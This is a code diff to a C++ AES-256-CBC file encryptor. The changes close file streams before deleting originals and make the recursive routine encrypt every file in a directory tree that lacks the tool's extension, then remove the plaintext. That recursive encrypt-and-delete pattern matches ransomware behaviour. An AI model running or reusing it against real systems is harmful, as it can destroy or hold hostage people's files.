@@ -26,6 +26,8 @@ AES256CBC::~AES256CBC() {
 
 // Methods
 
+
+
 bool AES256CBC::decryptFile(std::filesystem::path path) {
     cout() << "[#] Decrypting " << path << "...\n";
     if (path.extension() != extension_) {
@@ -66,6 +68,9 @@ bool AES256CBC::decryptFile(std::filesystem::path path) {
                         // Maybe also unify the handling with the encryption
                         // function (also make it use one "path" and have it
                         // appended)
+
+    fin.close();
+    fout.close();
     std::filesystem::remove(path);
     cout() << " └─[✓] Done.\n";
     return true;
@@ -116,8 +121,10 @@ bool AES256CBC::encryptFile(const std::filesystem::path& pathIn) {
 
     EVP_EncryptFinal_ex(ctx, encryptedBuffer, &encryptedLen);
     fout.write((char*)encryptedBuffer, encryptedLen);
-    std::filesystem::remove(pathIn);
 
+    fin.close();
+    fout.close();
+    std::filesystem::remove(pathIn);
     EVP_CIPHER_CTX_free(ctx);
     cout() << " └─[✓] Done.\n";
     return true;
@@ -132,7 +139,7 @@ void AES256CBC::encryptRecursively(const std::filesystem::path& path) {
     generateKey();
     for (const auto &entry : std::filesystem::recursive_directory_iterator(path)) {
         std::filesystem::path filename = entry.path();
-        if (/*entry.extension() != extension_ and*/ std::filesystem::is_regular_file(entry))
+        if (filename.extension() != extension_ and std::filesystem::is_regular_file(entry))
             encryptFile(filename);
     }
 }
